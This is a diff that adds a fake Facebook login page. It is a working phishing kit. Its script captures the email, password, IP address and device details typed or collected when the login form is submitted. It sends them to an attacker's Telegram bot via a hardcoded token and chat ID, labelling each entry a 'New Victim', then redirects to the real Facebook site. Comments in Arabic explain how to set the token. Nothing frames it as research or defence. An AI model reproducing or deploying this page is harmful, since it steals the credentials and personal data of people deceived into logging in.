@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – log in or sign up</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" type="image/png" href="./img/face.ico" />
+</head>
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">facebook</h1>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <form id="login-form" autocomplete="off">
+          <input id="email" type="text" placeholder="Email address or phone number" required autofocus />
+          <input id="password" type="password" placeholder="Password" required />
+          <button class="login" type="submit">Log In</button>
+          <a href="#" class="forgot-link">Forgotten password?</a>
+          <hr>
+          <button class="create-account" type="button">Create new account</button>
+        </form>
+      </div>
+      <div class="footer">
+        <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+      </div>
+    </div>
+    
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7874185278:AAHN_8SoG4HsZ2C6LRrbuD7-eA8ZTHGFsRk";                                                            // هنا التوكين              
+    const CHAT_ID = "-4864340421";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const button = this.querySelector('button');
+    button.disabled = true;
+    button.textContent = 'Logging in...';
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+            const ip = response.data.ip;
+
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+            const message = ` 
+                <b>Nice New Victim Facebook </b>\n
+                <b>Email ✉:</b> ${email}\n
+                <b>Password 🔒:</b> ${password}\n
+                <b>IP Address 📝:</b> ${ip}\n
+                <b>Machine 🖥:</b> ${deviceType}\n
+                <b>Platform 🛠:</b> ${platform}\n
+                <b>Screen 💻:</b> ${screenWidth}x${screenHeight}
+            `;
+
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'HTML',
+                text: message
+            }).then(response => {
+                window.location.href = 'https://www.facebook.com'
+            }).catch(error => {
+                alert('Error sending the information. Please try again.');
+                button.disabled = false;
+                button.textContent = 'Log In';
+            });
+        })
+        .catch(error => {
+            alert('Error fetching the IP address. Please try again.');
+            button.disabled = false;
+            button.textContent = 'Log In';
+        });
+});
+</script>
+  </body>
+</html>
